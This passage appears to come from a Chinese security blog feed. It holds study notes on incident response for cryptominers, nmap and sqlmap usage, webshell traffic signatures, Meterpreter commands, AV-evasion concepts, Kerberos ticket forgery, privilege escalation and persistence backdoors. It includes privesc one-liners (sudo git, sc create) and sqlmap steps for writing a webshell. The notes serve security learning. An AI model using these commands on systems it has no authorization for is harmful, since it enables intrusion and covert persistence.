title="补充：screen的原理"></a>补充：screen的原理</h5><ul><li>当用户启动Screen时，它会创建一个守护进程作为后台进程，并与用户终端会话（称为控制终端）分离。</li><li>控制终端不再直接处理用户输入和输出，而是由Screen守护进程负责接收和处理。</li><li>守护进程通过与Unix域套接字进行通信，与控制终端保持连接。</li><li>用户在控制终端中输入的命令会被发送到守护进程，并由守护进程解析和执行。</li><li>守护进程还负责从虚拟终端读取输出内容，并将其发送回控制终端进行显示。</li></ul><p>通过这种方式，Screen实现了在控制终端与守护进程之间的交互，并通过守护进程来管理多个虚拟终端、处理窗口切换、保存会话状态等功能。<br>需要注意的是，虽然Screen的守护进程在后台运行，但用户仍然可以通过重新连接到控制终端来恢复与之前会话的交互，即使之前的SSH连接断开或终端关闭。这是Screen的一个重要特性，允许用户在断开连接后恢复他们的工作环境。</p><h5 id="补充：恢复守护进程会话的交互"><a href="#补充：恢复守护进程会话的交互" class="headerlink" title="补充：恢复守护进程会话的交互"></a>补充：恢复守护进程会话的交互</h5><p>可以使用<code>nohup</code>命令启动一个守护进程，并将输出重定向到文件中，例如：</p><pre class="line-numbers language-shell"><code class="language-shell">nohup ./your_daemon &<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过这种方式启动的守护进程不会因为用户退出终端而停止运行。</p><p>当用户重新连接到控制终端时，可以使用<code>jobs</code>命令查看守护进程的状态，并使用<code>fg</code>命令将其调至前台，恢复与之前会话的交互。例如：</p><pre class="line-numbers language-shell"><code class="language-shell">jobsfg %job_id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其中，<code>job_id</code>是守护进程的作业号，可以在<code>jobs</code>命令的输出中找到。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>挖矿事件排查</title>
      <link href="/2023/08/13/%E6%8C%96%E7%9F%BF%E4%BA%8B%E4%BB%B6%E6%8E%92%E6%9F%A5/"/>
      <url>/2023/08/13/%E6%8C%96%E7%9F%BF%E4%BA%8B%E4%BB%B6%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h5 id="第一步：获取信息"><a href="#第一步：获取信息" class="headerlink" title="第一步：获取信息"></a>第一步：获取信息</h5><ul><li>下线服务器之后从DNS服务器、防火墙、态势感知平台等地方获取到攻击事件详细信息</li><li>根据上传来源的IP/域名，在威胁情报平台查询确定木马类型</li><li>获取异常进程的pid</li></ul><pre><code>CPU占用：top -c -o %CPUps -eo pid,ppid,%mem,%cpu,cmd --sort=-%cpu | head -n 5内存占用：top -c -o %MEMps -eo pid,ppid,%mem,%cpu,cmd --sort=-%mem | head -n 5网络占用：安装后使用nethogs或者jnettop进行查询根据进程名或字符串查询：pidof &quot;name&quot;ps -aux | grep &quot;name&quot;ps -ef | grep &quot;name&quot; | grep -v grep | awk &#39;&#123;print $2&#125;&#39;pgrep -f &quot;name&quot;</code></pre><ul><li>根据pid查询详细信息（当查询不到时有可能是/proc/pid隐藏了）</li></ul><pre><code>lsof -p pidpwdx pidsystemctl status pidcat /proc/pid/mapsls -al /proc/pid/exe</code></pre><ul><li>根据pid查看对应线程</li></ul><pre><code>ps H -T -p pidps -aLf pidpstree -agplU（推荐使用）</code></pre><ul><li>确定进程运行时间</li></ul><pre><code>ps -eo pid,lstart,etime,cmd | grep &lt;pid&gt;</code></pre><ul><li>比对恶意文件的创建时间</li></ul><pre><code>stat xxx.xxls -al xxx.xx</code></pre><ul><li>样本采集分析</li></ul><pre><code>使用SCP/Xshell等将样本移出主机，计算哈希值后到威胁情报平台中去搜索certutil -hashfile 文件 MD5</code></pre><ul><li>进程查杀</li></ul><pre><code>【查找子进程】ps ajfxsystemctl status【杀死进程】kill -9 pid   （这样子是杀不死子进程的！！！）kill -9 -pid   （杀掉进程组）</code></pre><ul><li>删除文件</li></ul><pre><code># 查看文件占用，解除占用后删除lsof xxxx.xx# 移除 i, a 属性chattr -ia file.sh# 查看是否移除成功lsattr file.sh# 移除文件rm -rf file.sh# 奇怪文件名无法删除，先查inode再删除ls -li xxxx.xxfind ./* -inum 12327526 -deletefind ./ -inum 12327526 -exec rm &#123;&#125; \;find ./* -inum 12327526 -exec rm -i &#123;&#125; \;find ./* -inum 12327526 -exec rm -f &#123;&#125; \;find ./* -inum 12327526 |xargs rm -frm `find ./* -inum 12327526`# 目录挂载无法删除（Device or resource busy）sudo lsblk -asudo umount /dev/sdb1rm -rf xxxx.xx</code></pre><ul><li>网页挖矿排查</li></ul><pre><code># 浏览器查看历史记录，定位到该事件点访问的页面# 进入虚拟机进行访问，并限制进程只允许占用一个cpu# 查看该网页的源码和网络链接调用# 将浏览器缓存文件进行检测（大多数是JS）# 清除浏览数据&gt;清除缓存文件# 解密恶意文件查看矿池地址以及连接条件# 上区块链网站溯源</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全工具</title>
      <link href="/2023/08/12/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
      <url>/2023/08/12/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h5 id="Nmap常用命令"><a href="#Nmap常用命令" class="headerlink" title="Nmap常用命令"></a>Nmap常用命令</h5><pre><code>nmap hostname/ip或者多个ip或者子网192.168.123.*-iL ip.txt 扫描ip.txt的所有ip-A 包含了-sV，-O，探测操作系统信息和路由跟踪（激烈扫描，一般不用）-O 探测操作系统信息-sV 查找主机服务版本号-sA 探测该主机是否使用了包过滤器或防火墙（建议使用wafw00f）-sS 半开扫描，一般不会记入日志，不过需要root权限。-sT TCP connect扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。-sP ping扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。-sN TCP空扫描-F 快速扫描-p 指定端口/端口范围-oN 将报告写入文件-v 详细信息-T&lt;0-5&gt; 设定速度使用脚本：--script all 使用所有脚本--script=sql.injection.nse sql注入--script=&quot;smb*&quot; 扫smb系列一、4 大功能：分别为主机发现（参数-sn）、端口扫描(-sS -sU)、版本侦测(–sV)、OS侦测(-O)二、扫描方式有：tcp connect()、TCP SYN scanning、TCP FIN scanning、Nullscan等三、绕过 ping 扫描参数为：nmap -Pn XXX.XXX.XXX.XXX四、漏洞检测可直接 nmap 目标 --script=auth,vuln</code></pre><h5 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h5><pre><code>-u 单个URL -m xx.txt 多个URL-d &quot;mysql://user:password@10.10.10.137:3306/dvwa&quot; 作为服务器客户端，连接数据库--data post/get都适用-p 指定扫描的参数-r 读取文件-f 指纹信息--tamper 混淆脚本，用于应用层过滤--cookie --user-agent --host 对http头的修改--threads 并发线程，默认为1--dbms MySQL&lt;5.0&gt; 指定数据库或版本–level=LEVEL 执行测试的等级（1-5，默认为 1）–risk=RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险–current-db 获取当前数据库名称–dbs 枚举数据库管理系统数据库–tables 枚举 DBMS 数据库中的表–columns 枚举 DBMS 数据库表列-D DB 要进行枚举的数据库名-T TBL 要进行枚举的数据库表-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户常用的tamper：base64encode.py 转为b64编码charencode.py url编码chardoubleencode.py 双URL编码unmagicquotes.py 宽字节randomcomments.py 用`/**/`分割SQL关键字space2plus.py space2comment.py space2xxxx.py 替换空格为xxPost注入：sqlmap -r &quot;数据包地址&quot; -p &quot;参数&quot; -dbms 数据类型Get注入：sqlmap -u &quot;注入点地址&quot; --dbms 参数sqlmap进行交互式写shell：1-前提条件：最高权限、知道web网站绝对路径、能获取到cookie2-sqlmap.py -u &quot;注入点地址&quot; --cookie=&quot;cookie值&quot; --os-shell-echo “一句话木马”&gt;网站的绝对路径3-输入web网站的绝对路径4-传木马</code></pre><h5 id="菜刀、蚁剑、冰蝎、CS、哥斯拉"><a href="#菜刀、蚁剑、冰蝎、CS、哥斯拉" class="headerlink" title="菜刀、蚁剑、冰蝎、CS、哥斯拉"></a>菜刀、蚁剑、冰蝎、CS、哥斯拉</h5><p><strong>菜刀特征</strong><br>使用了base64的方式加密了发送给“菜刀马”的指令，其中的两个关键payload <code>z1</code>和<code>z2</code>，这个名字是可变的</p><p><strong>蚁剑特征</strong><br>默认的USER-agent请求头是<code>antsword xxx</code>，但是可以修改<code>/modules/request.js</code>文件<br>其中流量最中明显的特征为<code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</code>这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码<br>蚁剑混淆加密后还有一个比较明显的特征,即为参数名大多以<code>“_0x......=”</code>这种形式（下划线可替换），所以以_0x开头的参数名也很可能就是恶意流量</p><p><strong>冰蝎</strong><br>看包没有发现什么特征，但是可以发现它是POST请求的</p><ol><li>Accept头有<code>application/xhtml+xmlapplication/xmlapplication/signed-exchange</code>属于弱特征（UA头的浏览器版本很老）</li><li>特征分析<code>Content-Type: application/octet-stream</code>这是一个强特征，查阅资料可知octet-stream的意思是，只能提交二进制，而且只能提交一个二进制，如果提交文件的话，只能提交一个文件,后台接收参数只能有一个，而且只能是流（或者字节数组），所以很少使用</li></ol><p><strong>冰蝎2特征</strong><br>默认Accept字段的值很特殊,而且每个阶段都一样冰蝎内置了十余种UserAgent，每次连接shell会随机选择一个进行使用，但是可以在burp中修改ua头。<br><code>Content-Length: 16</code>, 16就是冰蝎2连接的特征</p><p><strong>冰蝎3特征</strong><br>目前很多waf等设备都做了冰蝎2的流量特征分析，所以3取消了动态密钥获取；抓包没有发现什么特征，但它是POST请求的</p><ol><li>Accept头<code>application/xhtml+xmlapplication/xmlapplication/signed-exchange</code>属于弱特征</li><li>ua头该特征属于弱特征，通过burp可以修改。冰蝎3.0内置的默认16个userAgent都比较老，也可以作为waf规则特征</li></ol><p><strong>哥斯拉特征</strong><br>【PHP连接特征】</p><ol><li>使用了php_XOR_BASE64</li><li>请求都含有”pass=”<br>【jsp连接特征】</li><li>使用了java_AES_BASE64</li><li>是用了java_AES_RAW</li><li>与php请求一样都含有<code>&quot;pass=&quot;</code>而且发起连接时服务器返回的Content-Length是0</li></ol><h5 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h5><p>过滤 ip:<br>过滤源 ip 地址:ip.src==1.1.1.1;,目的 ip 地址:ip.dst==1.1.1.1;<br>过滤端口:<br>过滤 80 端口:tcp.port==80,源端口:tcp.srcport==80,目的端<br>口:tcp.dstport==80<br>协议过滤:<br>直接输入协议名即可,如 http 协议 http<br>http 模式过滤:<br>过滤 get/post 包 http.request.mothod==”GET/POST”</p><h5 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h5><pre><code>常用命令：background  让meterpreter处于后台模式sessions -i number  与会话进行交互，number表示第n个sessionquit  退出会话shell  获得命令行cat  c:\\boot.ini 查看文件内容getwd  查看当前工作目录work directory upload /root/Desktop/netcat.exe c:\\   上传文件到目标机上download 0xfa.txt /root/Desktop/   下载文件到本机上edit c:\\boot.ini   编辑文件search -d d:\\www -f web.config  查找文件ps  查看当前活跃进程migrate pid  将Meterpreter会话移植到进 程数位pid的进程中execute -H -i -f cmd.exe  创建新进程getpid  获取当前进程的pid kill pid  杀死进程getuid  查看权限sysinfo  查看目标机系统信息，如机器名，操作系统等getsystem  提权操作timestompc:/a.doc -c &quot;10/27/2015 14:22:11&quot;  修改文件的创建时间迁移进程：- meterpreter &gt; ps- 自行选择PID- meterpreter &gt; migrate pid</code></pre><h4 id="一些免杀的了解"><a href="#一些免杀的了解" class="headerlink" title="一些免杀的了解"></a>一些免杀的了解</h4><p><strong>做免杀的原理：</strong><br>就是fuzz定位出被查杀的语句，然后对被查杀那部分进行加密、编码、动态执行、拆分拼接、特定条件执行等等。</p><p><strong>免杀分类：</strong><br>为静态免杀（单纯看hash值）、流量免杀（有通信流量就杀）、内存免杀（看内存运行特征）、动态免杀（行为感知）</p><p><strong>免杀语言分类：</strong></p><ol><li>编译型语言，编译器一次性将所有源代码编译为一个不可跨平台执行的可执行程序，一次编译可以重复执行（C、C++、Golang、汇编等）</li><li>解释型语言，使用解释器一边执行一边转换，不会生成可执行程序。（JavaScript、Python、PHP、Shell等）</li></ol><p><strong>免杀方法：</strong></p><ol><li>修改特征码，猜测杀软对哪几个字节进行查杀，再对应修改（几乎没用了）</li><li>shellcode加载器，改变加载到内存的方式和加密方式（主流）</li><li>反射dll加载，把dll加密，远程下载到内存中再解密执行（高级）</li></ol><h5 id="无文件执行木马的方式有哪些？"><a href="#无文件执行木马的方式有哪些？" class="headerlink" title="无文件执行木马的方式有哪些？"></a>无文件执行木马的方式有哪些？</h5><p>powershell（脚本解析器） 》》》powershell.exe（应用程序）<br>VB.script（脚本解析器） 》》》cscript.exe（应用程序）<br>bat处理 （脚本解析器） 》》》cmd.exe（应用程序）<br>javaSrtipt（脚本解析器） 》》》mshta.exe（应用程序）</p><h5 id="怎么做shellcode免杀？"><a href="#怎么做shellcode免杀？" class="headerlink" title="怎么做shellcode免杀？"></a>怎么做shellcode免杀？</h5><ol><li>编码</li><li>加壳</li><li>混淆</li><li>分离免杀</li><li>特征码修改</li><li>添加无用逻辑语句</li><li>重写api</li></ol><h5 id="分离免杀怎么做？"><a href="#分离免杀怎么做？" class="headerlink" title="分离免杀怎么做？"></a>分离免杀怎么做？</h5><p>分为加载器和shellcode两部分，一般将shellcode存储在网页或者图片中，然后加载器远程加载存在shellcode的网页或者图片之类的</p><h5 id="powershell怎么远程加载？"><a href="#powershell怎么远程加载？" class="headerlink" title="powershell怎么远程加载？"></a>powershell怎么远程加载？</h5><p>可以远程加载mimikazt，远控文件，exe可执行文件实现无文件落地。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透</title>
      <link href="/2023/08/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
      <url>/2023/08/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h5 id="内网渗透的流程"><a href="#内网渗透的流程" class="headerlink" title="内网渗透的流程"></a>内网渗透的流程</h5><ol><li>从外网拿下一个主机当做跳板</li><li>用<code>net user /domian</code>命令查看跳板机是否在域内，探测存活主机</li><li>提权、提取hash</li><li>进行横向移动，定位dc位置</li><li>查看是否有能直接提权域管的漏洞，拿到dc控制权后进行提权</li><li>最后制作黄金票据做好维权，清理日志</li></ol><h5 id="内网渗透的一些基础概念"><a href="#内网渗透的一些基础概念" class="headerlink" title="内网渗透的一些基础概念"></a>内网渗透的一些基础概念</h5><table><thead><tr><th>简写</th><th>全称</th><th>描述</th></tr></thead><tbody><tr><td>DC</td><td>Domain Controller</td><td>域控</td></tr><tr><td>KDC</td><td>Key Distribution Center</td><td>秘钥分发中心</td></tr><tr><td>AD</td><td>Account Database</td><td>账户数据库</td></tr><tr><td>ST</td><td>Service Tickets</td><td>ST服务票据，由TGS服务发送</td></tr><tr><td>AS</td><td>Authentication Server</td><td>身份验证服务，认证用户的身份，并为其发放TGT的服务</td></tr><tr><td>AP</td><td>Application Server</td><td>提供用户所需的服务</td></tr><tr><td>TGS</td><td>Ticket Granting Server</td><td>票据授予发放服务</td></tr><tr><td>TGT</td><td>Ticket Granting Ticket</td><td>TGT认证票据，由AS服务发放，存储在内存，默认有效期为10小时</td></tr><tr><td>黄金票据</td><td>Golden Ticket</td><td>使用域账号krbtgt的NTLM Hash进行加密</td></tr><tr><td>白银票据</td><td>Silver Ticket</td><td>使用服务账户的NTLM Hash进行加密</td></tr></tbody></table><h5 id="socket通信与代理"><a href="#socket通信与代理" class="headerlink" title="socket通信与代理"></a>socket通信与代理</h5><p><strong>两台计算机间的通信</strong>，其实是两台计算机中应用程序（进程）与应用程序（进程）间的通信。但“IP地址”仅能定位到计算机，如何定位到应用程序（进程）呢？答案是“协议+端口”。<br>如果你对同源策略有所了解就能马上反应过来，这就是IP + 协议 + 端口<br><strong>Socket</strong> 就是一个类，封装了许多功能函数，当需要建立连接进行通信时，它会先进行初始化，然后通过内置的功能函数建立连接并完成通信（打开、读/写IO、关闭），其中就包含了TCP的三次握手。<br><strong>正向代理和反向代理</strong>本质上并无区别，正向代理即客户端代理，代理客户端，服务端不知道实际发起请求的客户端。反向代理即服务端代理，代理服务端，客户端不知道实际提供服务的服务端。<br>正向代理可以隐藏用户的信息，并能够将其作为跳板访问我们无法访问的资源，如翻墙。反向代理可以隐藏服务器的信息，保障了内网的安全，同时能够用来实现负载均衡。（负载均衡也是防御DOS攻击的一种方式）<br>在<strong>地址转换与端口映射</strong>中，<code>静态NAT</code>是路由器上手动配置，一个内网地址和一个公网地址相关联，一一对应。<code>动态NAT</code>是路由器上配置一个公网IP地址池，当内网地址访问外网时从地址池里获取公网IP进行映射。当公网IP地址池分配完时，只能等待被占用的公网IP被释放后，其他主机才能获取公网IP访问公网。这种将源地址进行转换的方式也可称之为 SNAT（源地址转换）。<code>NAPT 网络地址端口转换</code>是允许多个内网地址映射到同一个公网IP的不同端口。这种将源地址和端口进行转换的方式也可称之为 SNAPT（源地址端口转换）。<br><strong>端口转发</strong>，有时被叫做隧道，是安全壳（SSH）为网络安全通信使用的一种方法。在内网中，是没有办法直接访问外网的。但是我们可以通过路由器的NAT方式访问外网。<br><strong>内网穿透</strong>是当想要访问内部网络但又没有权限去操作防火墙做端口映射的情况的时候，就需要搭建一条隧道来做端口转发和流量转发。<br><strong>正向socks</strong>：当一个机器同时存在内外网IP时就能在外网通过正向连接去访问其它内网机器，而且这里跳板机就相当于正向代理。因为对于攻击者来说它是可知的，而对于内网机来说，它们并不知道它们返回给跳板机的响应又被发送给了攻击者。<br><a href="https://smms.app/image/iTNEZ9mCukscY68" target="_blank"><img src="https://s2.loli.net/2023/08/06/iTNEZ9mCukscY68.png" ></a><br><strong>反弹socks</strong>：当目标机器没有公网IP，但可访问内网资源时。攻击者可以在内网跳板机上运行EarthWorm使其反弹到某台对外连接的内网服务器上，然后攻击者再通过外网连接到对外服务器进而进入到内网中。这里公网服务器既是正向代理也是反向代理。对于攻击者来说它是可知的，因为我们要通过它访问我们无法访问的资源；对于内网服务器（跳板机）来说它也是可知的，因为我们是在内网服务器（跳板机）上执行的反弹命令，使其反向连接到公网服务器上。而内网服务器（跳板机）在这里充当的仅是公网服务器的正向代理，因为它对于公网服务器来说是可知的，而对于其他内网机来说则是不可知的。<br><a href="https://smms.app/image/wH4klfLjbCJ7Qhi" target="_blank"><img src="https://s2.loli.net/2023/08/06/wH4klfLjbCJ7Qhi.png" ></a></p><h5 id="kerberos协议认证是什么？"><a href="#kerberos协议认证是什么？" class="headerlink" title="kerberos协议认证是什么？"></a>kerberos协议认证是什么？</h5><p>Kerberos是一种网络身份认证的协议，协议设计目的是通过使用秘钥加密技术为客户端/服务器应用程序提供强身份验证。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、修改和插入数据。在以上情况下，Kerberos作为一种可信任的第三方认证服务，通过传统的密码技术执行认证服务。<br><strong>Kerberos认证流程：</strong><br>票据中心授予的票据先去AS身份验证服务，返回身份验证，带着身份验证去TGS拿票据，带着拿回来的票据去服务器。</p><h5 id="白银票据与黄金票据的原理？"><a href="#白银票据与黄金票据的原理？" class="headerlink" title="白银票据与黄金票据的原理？"></a>白银票据与黄金票据的原理？</h5><p><strong>金票</strong>：在 Kerberos 认证中,Client 通过身份认证后,AS 会给 Client一个Logon Session Key 和 TGT,而 Logon Session Key 并不会保存在 KDC 中，krbtgt 的NTLM Hash 又是固定的,所以只要得到 krbtgt 的 NTLM Hash，就可以伪造TGT 和Logon Session Key 来进入下一步 Client 与 TGS 的交互。而已有了金票后,就跳过AS 验证,不用验证账户和密码,所以也不担心域管密码修改。<br><strong>银票</strong>：如果说黄金票据是伪造的 TGT,那么白银票据就是伪造的 ST。在 Kerberos 认证的第三步，Client 带着 ST 和Authenticator3 向 Server 上的某个服务进行请求，Server 接收到 Client 的请求之后,通过自己的 Master Key 解密 ST,从而获得Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份，验证成功就让 Client 访问 server 上的指定服务了。所以我们只需要知道 Server 用户的Hash 就可以伪造出一个 ST,且不会经过 KDC,但是伪造的门票只对部分服务起作用。<br><strong>金票和银票的区别</strong>：<br>获取的权限不同<br>认证流程不同<br>加密方式不同</p><h5 id="针对kerbores的攻击有哪些？"><a href="#针对kerbores的攻击有哪些？" class="headerlink" title="针对kerbores的攻击有哪些？"></a>针对kerbores的攻击有哪些？</h5><ol><li>用户名爆破</li><li>密码喷洒和密码爆破</li><li>Kerberoasting</li><li>ASRepRoasting</li><li>黄金票据和白银票据</li><li>MS14-068</li><li>非约束委派、约束委派、基于资源的约束委派</li><li>票据传递（ptt/ptk/ptc）</li><li>mimikatz加密降级攻击(万能钥匙)</li><li>使用恶意的kerberos证书做权限维持</li></ol><h5 id="黄金票的条件要求？"><a href="#黄金票的条件要求？" class="headerlink" title="黄金票的条件要求？"></a>黄金票的条件要求？</h5><p>1.域名称 AD PowerShell模块：（Get-ADDomain）.DNSRoot<br>2.域的SID 值 AD PowerShell模块：（Get-ADDomain）.DomainSID.Value（就是域成员SID值去掉最后的）<br>3.目标服务器的 FQDN<br>4.可利用的服务<br>5.域的KRBTGT账户NTLM密码哈希<br>6.需要伪造的用户名<br>一旦攻击者拥有管理员访问域控制器的权限，就可以使用Mimikatz来提取KRBTGT帐户密码哈希值</p><h5 id="票据伪造"><a href="#票据伪造" class="headerlink" title="票据伪造"></a>票据伪造</h5><p>票据分为黄金票据和白银票据。<br>黄金票据是伪造TGT，伪造黄金票据必须拿到域控管理员的权限才可以。<br>伪造黄金票据需要：域名城、域SID值、域的KRBTGT账户、NTLM哈希密码、伪造用户名</p><h5 id="横向连接方式"><a href="#横向连接方式" class="headerlink" title="横向连接方式"></a>横向连接方式</h5><p>$IPC、Psexec、WMI、Schtasks、AT、SC、WINRM</p><h5 id="如何获取内网中机器数量"><a href="#如何获取内网中机器数量" class="headerlink" title="如何获取内网中机器数量"></a>如何获取内网中机器数量</h5><p>可以使用命令net user /domian<br>使用扫描器扫一下</p><h5 id="内网环境不出网怎么办？"><a href="#内网环境不出网怎么办？" class="headerlink" title="内网环境不出网怎么办？"></a>内网环境不出网怎么办？</h5><ol><li>通过webshell实现内网socket代理</li><li>正向链接</li><li>ssh隧道</li><li>协议不同出网的方式不同，如dns对应dnscat2 tcp对应</li><li>测试是否是特定协议或端口出网</li></ol><h5 id="mimikatz使用方法"><a href="#mimikatz使用方法" class="headerlink" title="mimikatz使用方法"></a>mimikatz使用方法</h5><p>mimikatz是一款强大的系统密码破解获取工具。可以破解哈希值，是一个可加载的Meterpreter模块。<br>如果system的权限无法执行执行。需要先进行提权。<br>在meterpreter中输入<code>run post/multi/recon/local_exploit_suggester</code>，进行提权漏洞检测。</p><h5 id="拿下边界机器如何内网渗透？"><a href="#拿下边界机器如何内网渗透？" class="headerlink" title="拿下边界机器如何内网渗透？"></a>拿下边界机器如何内网渗透？</h5><p>拿下机器后，使用代理访问内网<br>windows环境：reGeorg与proxifier<br>Linux环境：reGeorg与proxychains，<br>使用nmap等工具进行扫描，发现web服务的主机和其它信息。有时这些边界机器上会记录一些内网服务器上的一些信息，这时候可以拿到探测的内部一些开放的端口判断进行渗透，通常用户这里基本是统一命名的，拿到的各种记录会暴露出部分内网通讯的ip.</p><h5 id="linux常见的提权办法"><a href="#linux常见的提权办法" class="headerlink" title="linux常见的提权办法"></a>linux常见的提权办法</h5><ol><li>uid提权 (find / -perm -u=s -type f 2&gt;/dev/null)</li><li><code>sudo git help config !/bin/bash</code> 或者 <code>！&#39;sh&#39;</code>完成提权</li><li>脏牛提权</li><li>内核提权</li><li>环境劫持</li><li>suid提权</li><li>cve-2021-4034</li><li>docker提权</li></ol><h5 id="Windows提权的若干办法？"><a href="#Windows提权的若干办法？" class="headerlink" title="Windows提权的若干办法？"></a>Windows提权的若干办法？</h5><ol><li>系统漏洞提权<br>通过 Webshell 命令行执行systeminfo 命令查看系统是否打了提权补丁，可使用 exp 进行提权<br>通过 Webshell 找网站读写执行目录，把 cs 马或提权 exp 上传到对方服务器（如果cmd无法执行命令可单独上传 cmd.exe 到对方服务器，菜刀终端设置为 setpc:\XXX\cmd.exe）</li><li>sc 命令提权（administrator–&gt;system）<br>例如：<code>sc Create syscmd binPath= “cmd /K start” type= own type=interactsc start systcmd</code>就得到了一个system权限的cmd环境</li><li>不带引号的服务路径<br>当服务路径带空格的时候，路径空格目录前面一断就会当作文件执行，如<code>C:\ProgramFiles\MSBuild</code> 这个目录，攻击者只要在c盘创建名为 <code>Program.exe</code> 的木马，最后只要系统重启就会执行 <code>C:\Program.exe</code> 文件。</li><li>不安全的服务权限提升<br>由于管理配置错误，用户可能对服务拥有过多的权限，例如用木马替换服务调用的默认文件。</li><li>绕过系统 UAC 提升<br>可通过 msf 里面的 getsystem 绕过 UAC,也可以通过 kail 模块的exploit/windows/local/bypassuac_injection、exploit/windows/local/bypassuac_vbs、exploit/windows/local/ask 绕过 UAC</li></ol><h5 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h5><p><strong>Windows机器：</strong></p><ol><li>替换系统文件类(shift 后门,放大镜后门)</li><li>修改注册表类<br>自启动项、屏幕保护程序注册表、用户登陆初始化、登录脚本、映像劫持、影子账户、AppCertDlls 注册表项、AppInit_DLLs 注册表项、文件关联、用户登陆初始化、xx.Netsh Helper DLL</li><li>文件类<br>自启动文件夹、office Word StartUp 劫持</li><li>计划任务<br>schtasks 、WMI、bitsadmin</li></ol><p><strong>Linux:</strong></p><ol><li>预加载型动态链接库后门</li><li>strace 后门</li><li>SSH 后门</li><li>SUID 后门</li><li>inetd 服务后门</li><li>协议后门</li><li>vim 后门</li><li>PAM 后门</li><li>进程注入</li><li>Rootkit</li><li>端口复用</li></ol><h5 id="拿到shell后如何接管域控？"><a href="#拿到shell后如何接管域控？" class="headerlink" title="拿到shell后如何接管域控？"></a>拿到shell后如何接管域控？</h5><p>如果拿到的就是域内用户，定位一下域控，提取本机<code>hash</code>看域管是否登陆过本机，是否有域用户的进程之类的注入域用户进程窃取下权限，然后使用一些域内漏洞来提权到域管从而接管域控，然后通过<code>dcsync</code>权限维持或者<code>adminsdhound</code>权限维持，也可以修改机器账号的<code>useraccount</code>为 8192 达成权限维持。<br>（注：把机器账户的UserAccountControl属性修改为8192后，活动目录就会认为这个机器账户是域控）</p><h5 id="内网渗透搭建隧道常见的攻击？"><a href="#内网渗透搭建隧道常见的攻击？" class="headerlink" title="内网渗透搭建隧道常见的攻击？"></a>内网渗透搭建隧道常见的攻击？</h5><p><strong>frp、ew、ssh、Neo-reGeorg、netsh、Lcx</strong><br>网络层：Ipv6情况、icmp情况、Gre隧道0<br>传输层：Tcp 隧道、udp 隧道 常规端口转发<br>应用层：ssh隧道、http隧道、https隧道、dns隧道</p><h5 id="内网横向扩展具体方法？"><a href="#内网横向扩展具体方法？" class="headerlink" title="内网横向扩展具体方法？"></a>内网横向扩展具体方法？</h5><p>密码喷洒、IPC$、WMI、mimikatz、PTH、MS14-068、web漏洞、系统漏洞</p><h5 id="KDC服务默认开放哪些端口？"><a href="#KDC服务默认开放哪些端口？" class="headerlink" title="KDC服务默认开放哪些端口？"></a>KDC服务默认开放哪些端口？</h5><p>88 kerberos krb5、464kerberos kpasswd（v5）</p><h5 id="桌面有管理员会话，想要做会话劫持怎么做？"><a href="#桌面有管理员会话，想要做会话劫持怎么做？" class="headerlink" title="桌面有管理员会话，想要做会话劫持怎么做？"></a>桌面有管理员会话，想要做会话劫持怎么做？</h5><p>提权到system权限，然后去通过工具，就能够劫持任何处于已登录用户的会话，而无需获得该用户的登录凭证。<br>终端服务会话可以是连接状态也可以是未连接状态</p><h5 id="域内攻击方法有什么？"><a href="#域内攻击方法有什么？" class="headerlink" title="域内攻击方法有什么？"></a>域内攻击方法有什么？</h5><p>MS14-068、Roasting攻击离线爆破密码、非约束性委派、基于资源的约束委派、ntlmrelay、CVE-2021-42287/CVE-2021-42278</p><h5 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h5><p>procdump+mimikatz 转储然后用mimikatz离线读取，或者Sam获取然后离线读取。<br>windows server 2012之后，或者打了补丁都抓不到了。<br>只能翻阅文件查找运维等等是否记录密码，或者hash传递、或者获取浏览器的账号密码。</p><h5 id="psexec和wmic的区别"><a href="#psexec和wmic的区别" class="headerlink" title="psexec和wmic的区别"></a>psexec和wmic的区别</h5><p>psexec会记录大量日志，wmic不会记录日志并且更为隐蔽</p><h5 id="横向渗透命令执行手段"><a href="#横向渗透命令执行手段" class="headerlink" title="横向渗透命令执行手段"></a>横向渗透命令执行手段</h5><p>psexec，wmic，smbexec，winrm，net use共享+计划任务+type命令</p><h5 id="内网的白名单如何突破？"><a href="#内网的白名单如何突破？" class="headerlink" title="内网的白名单如何突破？"></a>内网的白名单如何突破？</h5><ul><li>利用已在白名单中的软件执行目标代码，甚至发动无文件攻击</li><li>白名单污染</li><li>暴力破解白名单防护软件</li></ul><h5 id="内网135端口具体有哪些利用方式？"><a href="#内网135端口具体有哪些利用方式？" class="headerlink" 